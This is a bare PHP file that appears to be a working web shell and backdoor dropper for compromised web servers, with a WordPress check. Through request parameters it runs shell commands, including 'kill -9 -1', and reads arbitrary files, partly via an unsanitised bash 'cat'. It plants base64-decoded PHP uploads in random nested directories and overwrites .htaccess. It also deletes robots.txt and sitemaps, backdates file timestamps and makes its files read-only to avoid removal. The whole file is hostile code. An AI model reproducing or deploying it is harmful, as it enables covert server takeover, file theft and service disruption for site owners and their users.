<?php
error_reporting(0);
@set_time_limit(0);
function fe($s){ return function_exists($s); }
function fex($s){ return file_exists($s); }

$a = $_REQUEST["a"];
if($a == "c") die("ps7n4K3CBK");
if($a == "ul") (die(@unlink(__FILE__)));
if($a == "k") die(@execute("kill -9 -1"));

if(!defined("ROOT")){
    $U = $_SERVER["PHP_SELF"];
    if(!$U){
        $a = explode("?",$_SERVER["REQUEST_URI"]);
        $U= $a[0];
    }
    $P = __FILE__;
    if(!$P)$P = $_SERVER["PATH_TRANSLATED"];
    if(!$P)$P = $_SERVER["SCRIPT_FILENAME"];
    define("ROOT", str_replace($U,"",$P),false);
}
function r($p){ return ROOT."/".ltrim($p,"/"); }
@unlink(r("sitemap.xml"));
@unlink(r("sitemap_index.xml"));
@unlink(r("robots.txt"));
@userIni();
switch ($a){
    case "r":@r_f();break;
    case "b":@back(); break;
    case "h":@htac();break;
    case "hj":@hija();break;
    case "iw":@isWP();break;
}

function isWP(){
    try {
        $f = r("wp-includes/version.php");
        if (fex($f)) {
            $wp_version = "";
            include_once($f);
            die($wp_version != ""?"1":"0");
        }
    } catch (Exception $e) {}
    die("") ;
}
function execute($cfe) {
    $res = '';
    if ($cfe) {
        if(function_exists('system')) {
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('passthru')) {
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('shell_exec')) {
            $res = @shell_exec($cfe);
        } elseif(function_exists('exec')) {
            @exec($cfe,$res);
            $res = join("\n",$res);
        } elseif(@is_resource($f = @popen($cfe,"r"))) {
            $res = '';
            while(!@feof($f)) {
                $res .= @fread($f,1024);
            }
            @pclose($f);
        }
    }
    return $res;
}
function r_f(){
    $f = $_REQUEST["f"];
    $e = $_REQUEST["e"];
    if($f)echo readF(r($f.$e));
    die();
}
function userIni(){
    $f = r("user.ini");
    if(fex($f)){
        $s = readF($f);
        if(strpos($s,"auto_append_file") !==false){
            fileWrite($f,preg_replace('@auto_append_file.+?$@i',"",$s),false);
        }
    }
}
function getRandDirs($p,$l){
    $a = "";
    for ($i=0;$i<$l;$i++) {
        $v=getRandDir($p.$a);
        if(!$v) break;
        $a .= $v.'/';
    }
    return trim($a,"/");
}
function getRandDir($p){
    $arr  = array();
    $dir = scandir($p);
    foreach ($dir as $v) {
        if ($v == '.' || $v == '..') continue;
        if (is_dir($p . '/' . $v))$arr[] = $v;
    }
    if(count($arr) == 0) return null;
    return $arr[array_rand($arr)];
}
function b64decode($str){
  return base64_decode(substr($str,6,strlen($str)-12));
}
function fileRead($p){
    $f = file_get_contents($p);
    if(!$f){
        $fp = fopen($p, "r");
        $f = fread($fp, filesize($p));
    }
   return $f;
}
function fileWrite($p,$c,$b){
    $tt= mktime(19,5,10,10,26,2021);
    if(fex($p)){
        $tt=@filemtime($p);
        @chmod($p,0666);
    };
    if(fex($p))@rename($p,$p."back");
    if(fex($p))@unlink($p);
    $t = !1;
    $p2=@fopen($p,"w");if($p2){$t=@fwrite($p2,$c);@fclose($p2);}
    if(!$t) $t = @file_put_contents($p,$c);
    if($t){@touch($p,$tt,$tt);if($b)@chmod($p,0444);}
    return (bool)$t;
}
function saveFile($name,$tmp,$ext){
    $f = r($name."bk");
    $t = fileWrite($f,b64decode(fileRead($tmp)),1);
    if($t)@rename($f,r($name.$ext));
    return $t;
}
function back(){
    $data = array();
    foreach ($_FILES as $k=>$v){
         $d= getRandDirs(r(''),rand(3,6));
        $f =$d.'/'.$k;
        $data[] = array("n"=>$k,"d"=>$d,"s"=>saveFile($f,$v["tmp_name"],".php"));
        @unlink($v["tmp_name"]);
    }
    die(json_encode($data));
    //die(base64_encode(json_encode($data)));
}
function htac(){
    $n = ".htaccess";
    $f = r($n);
    if(fex($f))@unlink($f);
    if(fex($f))@rename($f,$f.".bk");
    $t= saveFile($n,$_FILES["h"]["tmp_name"],"");
    @unlink($_FILES["h"]["tmp_name"]);
    die($t);
}

function hija(){
    if(count($_FILES) == 0)die(0);
    $arr = array_keys($_FILES);
    $name = end($arr);
    $d= "";
    $n= "";
    if(!empty($_REQUEST["d"])) $d = $_REQUEST["d"];
    if(!empty($_REQUEST["n"])) $n = $_REQUEST["n"];
    if($n != "") $d =getRandDirs(r(''),$n);
    $f = r($name.".php");
    if($d != "") {
        $f = r($d."/".$name.".php");
        mkdir(r($d),0777,true);
    };
    if(fex($f))@unlink($f);
    die(fileWrite($f, b64decode(fileRead($_FILES[$name]["tmp_name"])),1)?"1".($n!=""?"-".$d:""):"0");
}
function readF($f){
    if(!fex($f))return "";
    $s = file_get_contents($f);
    if(empty($s)){
        $fp = @fopen($f, 'r');
        if($fp) {
            while( !@feof($fp) )
                $s .= @fread($fp, 1024);
            @fclose($fp);
        }
    }
    if(empty($s)){
        $s = @execute("/bin/bash -c 'cat ".$f."'");
    }
    return $s;
}